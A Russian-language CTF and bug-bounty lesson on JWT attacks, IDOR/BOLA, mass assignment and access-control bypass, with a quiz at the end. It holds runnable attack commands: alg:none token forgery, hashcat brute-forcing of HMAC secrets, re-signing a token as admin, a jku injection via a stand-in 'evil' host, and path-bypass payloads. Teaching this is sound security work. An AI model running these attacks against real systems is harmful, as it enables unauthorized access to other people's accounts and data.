---
id: web-auth-jwt-idor
title: "Аутентификация, JWT, IDOR и контроль доступа"
category: web
parent: web-recon-attack-entry
difficulty: medium
order: 1
tags: [auth, jwt, idor, bola, access-control, session, oauth]
prerequisites: [web-recon-fuzzing]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
estimated_minutes: 45
summary: "Разбираем сессии и токены, ломаем JWT, находим IDOR/BOLA и обходим контроль доступа по-настоящему."
---

Аутентификация отвечает на вопрос «кто ты», авторизация — «что тебе можно». Большинство реальных веб-багов — это ошибки второго уровня: пользователь аутентифицирован, но имеет доступ к чужим данным. Это Broken Access Control (OWASP A01) — класс, который в bug-bounty встречается чаще любого другого.

## Теория: сессии, токены, JWT, OAuth

**Классические сессии.** После логина сервер выдаёт случайный `session_id` в cookie и хранит состояние на своей стороне (в памяти/Redis/БД). Cookie-флаги, которые важно проверять:
- `HttpOnly` — JS не может прочитать cookie (защита от XSS-кражи сессии);
- `Secure` — cookie уходит только по HTTPS;
- `SameSite` — защита от CSRF.

**JWT (JSON Web Token).** Самодостаточный токен из трёх частей, разделённых точками: `header.payload.signature`, каждая — base64url.

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9 . eyJ1aWQiOjEyMywicm9sZSI6InVzZXIifQ . <signature>
```

- header: `{"alg":"HS256","typ":"JWT"}`;
- payload: `{"uid":123,"role":"user","exp":...}`;
- signature: HMAC или RSA/ECDSA подпись header+payload.

Типичные ошибки реализации JWT:
1. **`alg: none`** — если сервер принимает незаподписанный токен.
2. **Путаница HS256/RS256** — публичный RSA-ключ используется как HMAC-секрет.
3. **Слабый секрет** — HMAC-ключ брутится по словарю.
4. **Нет проверки `exp`/`iss`/`aud`.**
5. **Доверие `kid`/`jku`/`x5u`** — подстановка своего ключа.

**OAuth/OIDC.** Протокол делегированной авторизации. Частые баги: отсутствие/непроверка `state` (CSRF), открытый `redirect_uri` (кража кода), слабая привязка токена к клиенту.

**IDOR / BOLA.** Insecure Direct Object Reference / Broken Object Level Authorization — доступ к объекту по прямому идентификатору (`/api/orders/1002`) без проверки, что объект принадлежит текущему пользователю. Меняем `1002` на `1001` — и получаем чужой заказ.

## Инструменты: jwt_tool, hashcat, ручной анализ

**Декодирование JWT без библиотек:**

```bash
TOKEN='eyJ...'
echo "$TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null; echo
echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null; echo
```

(или `jwt_analyze`, если инструмент доступен — он сразу укажет `alg:none`, слабый секрет, отсутствие `exp`).

**jwt_tool** — атаки на JWT:

```bash
# все известные атаки
jwt_tool "$TOKEN" -M at
# alg:none
jwt_tool "$TOKEN" -X a
# подбор секрета HS256
jwt_tool "$TOKEN" -C -d /usr/share/wordlists/rockyou.txt
# HS/RS confusion
jwt_tool "$TOKEN" -X k -pk public.pem
```

**hashcat** для HMAC-секрета:

```bash
# JWT HS256 = mode 16500
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

**Проверка IDOR** — руками, меняя идентификатор и сравнивая ответы двух аккаунтов:

```bash
curl -s -b jar_userA.txt https://api.example/orders/1002 | jq .
curl -s -b jar_userB.txt https://api.example/orders/1002 | jq .
```

Если B видит заказ A — это IDOR.

## Разобранный пример: цепочка «JWT alg:none → privilege escalation → IDOR»

Цель — `https://app.example`. Получаем токен обычного пользователя.

Шаг 1. Логинимся и сохраняем токен:

```bash
curl -s -X POST https://app.example/api/login \
  -H 'Content-Type: application/json' \
  -d '{"user":"bob","pass":"bob123"}' | tee login.json
TOKEN=$(jq -r .token login.json)
```

Шаг 2. Декодируем payload:

```bash
echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null; echo
# {"uid":5,"username":"bob","role":"user"}
```

Шаг 3. Пробуем `alg:none`. Формируем токен с пустой подписью:

```bash
HDR=$(printf '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
PL=$(printf '{"uid":1,"username":"admin","role":"admin"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
FORGED="$HDR.$PL."
curl -s -b "token=$FORGED" https://app.example/api/admin/users
```

Если сервер принимает — мы админ. Если нет, пробуем вариант с `alg:HS256` и подписью пустым/угаданным секретом, либо брутим секрет hashcat-ом.

Шаг 4. Допустим, сервер отклоняет `alg:none`, но использует слабый секрет `secret`. Брутим:

```bash
echo "$TOKEN" > jwt.txt
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt --quiet
# -> secret
```

Шаг 5. Переподписываем с `role:admin`:

```bash
python3 - <<'PY'
import hmac,hashlib,base64,json
def b64(b): return base64.urlsafe_b64encode(b).rstrip(b'=')
hdr=b64(json.dumps({"alg":"HS256","typ":"JWT"},separators=(',',':')).encode())
pl=b64(json.dumps({"uid":1,"username":"admin","role":"admin"},separators=(',',':')).encode())
sig=b64(hmac.new(b"secret",hdr+b'.'+pl,hashlib.sha256).digest())
print((hdr+b'.'+pl+b'.'+sig).decode())
PY
```

Шаг 6. С админ-токеном идём в IDOR: `/api/users/1` (админ), `/api/orders/1002` — теперь видим чужие данные. Часто флаг/секрет лежит в админской ручке.

## Обход контроля доступа (чеклист)

- Менять ID в URL/теле/заголовке (`X-User-Id`, `X-Account`).
- Менять HTTP-метод (`GET`→`POST`→`PUT`→`DELETE`): иногда ACL проверяется только на одном методе.
- Менять регистр/расширение пути: `/admin` → `/Admin`, `/admin/`, `/admin.json`.
- Использовать `..;/`, `//`, `%2e%2e/`, `%00` для обхода path-based ACL.
- Пробовать «функциональный» доступ: `role=admin` в профиле (mass assignment).
- Проверять `JWT`/cookie от другого аккаунта, менять `uid`, `sub`, `role`.
- Пробовать доступ без токена (`Authorization` удалён) — иногда проверка «спрятана» только на фронте.
- Проверять «горизонтальный» доступ: тот же ресурс у другого пользователя того же уровня.

## Типичные ошибки новичков

- **Путать аутентификацию и авторизацию.** «Меня пускает в аккаунт» ≠ «мне можно смотреть чужой аккаунт».
- **Проверять IDOR только изменением на `1`.** Иногда `1` — системный объект; меняйте на соседние ID и на ID другого известного пользователя.
- **Забыть про параметры, не видные в UI.** `?user_id=`, `?account=`, поля в JSON — частая цель IDOR.
- **Считать JWT «непробиваемым».** Реализации регулярно ломаются на `alg:none`, слабом секрете или confusion.
- **Не проверять `exp`.** Просроченный токен иногда всё ещё принимается — это отдельный баг.
- **Игнорировать `state` в OAuth.** Отсутствие/предсказуемость `state` = CSRF на OAuth-флоу.
- **Не сравнивать два аккаунта.** Без «эталонного» второго пользователя сложно доказать, что доступ чужой.

## IDOR: типы и техники

IDOR (Insecure Direct Object Reference) — доступ к чужому объекту по его идентификатору. Виды: **horizontal** (чужой объект того же уровня), **vertical** (объект более привилегированного уровня), **по прямому ID** (числа, UUID), **через параметр** (скрытое поле, заголовок, JSON), **через метод** (POST вместо GET). Ключ к обнаружению — понять, где приложение использует «ID объекта» и проверить, авторизует ли оно доступ к нему.

```bash
# базовый тест: свой объект vs чужой
curl -s -b jar https://t/api/orders/1001 | jq '.user_id'   # свой
curl -s -b jar https://t/api/orders/1002 | jq '.user_id'   # чужой?
# ID в скрытом поле / заголовке
curl -s -b jar -X POST https://t/api/profile -d 'user_id=57&role=admin'
curl -s -b jar https://t/api/me -H 'X-User-Id: 57'
```

UUID не защищает от IDOR: если UUID утекает (в ответах API, в JS, в письмах), его можно подставить. Проверяйте утечки UUID и не считайте их «непредсказуемыми».

## JWT: полный набор атак

Помимо `alg:none` и подбора секрета, есть **key confusion** (RS256→HS256: подписываем публичным ключом), **kid injection** (path traversal/SQLi в `kid`, чтобы подставить `/dev/null`), **jku/x5u injection** (подсунуть свой JWKS), **claim tampering** (изменить `role`/`user`), **отсутствие проверки подписи** (сервер декодирует без проверки). Проверяйте каждую.

```bash
jwt_tool $T -M at -np                       # alg:none
jwt_tool $T -C -d wordlist.txt              # слабый HMAC
jwt_tool $T -X k -pk pub.pem                # confusion
jwt_tool $T -I -hc kid -hv /dev/null        # kid traversal
jwt_tool $T -X s -ju http://evil/jwks.json  # jku
```

## Массовое присваивание и BFLA

**Mass assignment** — когда приложение слепо принимает поля из запроса и записывает их в объект. Если отправить `"role":"admin"` или `"isAdmin":true`, можно повысить привилегию.

```bash
curl -s -b jar -X PATCH https://t/api/me -H 'Content-Type: application/json' \
  -d '{"email":"me@x","role":"admin","isAdmin":true,"verified":true}'
```

**BFLA** (Broken Function Level Authorization) — доступ к функциям более высокого уровня (админские эндпоинты) обычным пользователем. Проверяйте админские API с обычной сессией: `/admin/*`, `/api/internal/*`, `/api/v1/users/{id}/role`.

```bash
# обычной сессией к админскому эндпоинту
curl -s -b jar https://t/api/admin/users | jq .
curl -s -b jar -X POST https://t/api/users/1/role -d 'role=admin'
```

## Что делать дальше / решение

Для каждого объекта/функции задайте три вопроса: знаю ли я ID (и можно ли его угадать/утечь)? Проверяет ли сервер владение? Проверяет ли сервер роль? Если хотя бы один ответ «нет» — уязвимость. Подтверждайте доступом к **чужим** данным (не к своим). Доводите до артефакта: чужие заказы/сообщения/профиль или админ-функция. И проверяйте все способы передачи ID (query, тело, заголовок, cookie, путь), а не только очевидный.

## Обход контроля доступа: расширенный чек-лист

Контроль доступа — самая частая уязвимость в вебе, и проверять её нужно системно. Пройдитесь по каждому уровню: объект (IDOR), функция (BFLA), роль (привилегии), поле (mass assignment), состояние (workflow). Для каждого — три проверки: знаю ли ID, проверяет ли сервер владение, проверяет ли роль.

| Уровень | Что проверять | Пример обхода |
|---------|---------------|---------------|
| объект | чужой ID | `/api/orders/1002` |
| функция | админ-эндпоинт | `/api/admin/users` |
| роль | повышение привилегии | `role=admin` в PATCH |
| поле | лишние поля | `{"isAdmin":true}` |
| состояние | пропуск шага | сразу POST финального шага |
| метод | другой verb | `PUT` вместо `POST` |

Отдельно проверьте **неочевидные пути**: `X-Original-URL`, `X-Rewrite-URL`, добавление `.json`/`;`/`/`, регистр, `%2e`, чтобы обойти роутинг-проверки.

```bash
curl -s -b jar https://t/api/admin -H 'X-Original-URL: /api/admin'
curl -s -b jar https://t/api/admin/;/
curl -s -b jar https://t/api/Admin
```

## Цепочка: IDOR + mass assignment = эскалация

Часто находки соединяются. IDOR даёт доступ к чужому объекту, mass assignment — изменение его полей. Вместе: читаем чужой профиль, меняем в нём роль, получаем админа.

```bash
# 1. читаем чужой профиль (IDOR)
curl -s -b jar https://t/api/users/1 | jq '.role'
"user"
# 2. меняем роль (mass assignment)
curl -s -b jar -X PATCH https://t/api/users/1 -H 'Content-Type: application/json' \
  -d '{"role":"admin"}'
# 3. проверяем
curl -s -b jar https://t/api/admin | jq .
```

## Что делать дальше / решение

Систематически проверяйте контроль доступа на всех уровнях, фиксируйте отрицательные результаты и подтверждайте находки доступом к чужим данным/функциям. Доводите до артефакта (чужой объект или админ-функция) и оформляйте минимальный PoC. Если прямые проверки не дали результата, ищите обходы роутинга и комбинации с другими примитивами (IDOR + mass assignment, JWT + BFLA).

## Квиз

Выберите один вариант в каждом вопросе.

```quiz
- question: "Что такое IDOR?"
  options:
    - "Инъекция SQL"
    - "Доступ к чужому объекту по прямому идентификатору без проверки прав"
    - "Кража TLS-сертификата"
    - "Отказ в обслуживании"
  answer: 1
  explanation: "Broken Object Level Authorization."
- question: "Как атака `alg:none` работает в JWT?"
  options:
    - "Подделывает подпись алгоритмом none, и сервер принимает незаподписанный токен"
    - "Шифрует payload"
    - "Ломает HMAC-секрет"
    - "Меняет `exp`"
  answer: 0
  explanation: "Если сервер не требует подпись, токен можно подделать."
- question: "Какая команда подбирает HMAC-секрет JWT через hashcat?"
  options:
    - "`hashcat -m 0`"
    - "`hashcat -m 16500`"
    - "`hashcat -m 1000`"
    - "`hashcat -m 22000`"
  answer: 1
  explanation: "Mode 16500 = JWT (HS256)."
- question: "Что защищает cookie-флаг `HttpOnly`?"
  options:
    - "От CSRF"
    - "От чтения cookie через JavaScript (снижает урон от XSS)"
    - "От перехвата по HTTP"
    - "От SQLi"
  answer: 1
  explanation: "`Secure` — от перехвата, `SameSite` — от CSRF."
- question: "Какой параметр OAuth защищает от CSRF на флоу авторизации?"
  options:
    - "`redirect_uri`"
    - "`state`"
    - "`scope`"
    - "`client_id`"
  answer: 1
  explanation: "`state` должен быть случайным и проверяемым."
```

## Где пригодится

- **CTF (Web):** JWT-задачи и IDOR — постоянные классы; часто флаг — чужая корзина/заказ/профиль.
- **Bug bounty:** Broken Access Control — самая частая и высокооплачиваемая категория (P1/P2).
- **Пентест:** проверка контроля доступа на каждом объекте — обязательный пункт методологии.
- **Работа (AppSec):** ревью проверок авторизации и корректной настройки сессий/JWT — базовая задача безопасника.
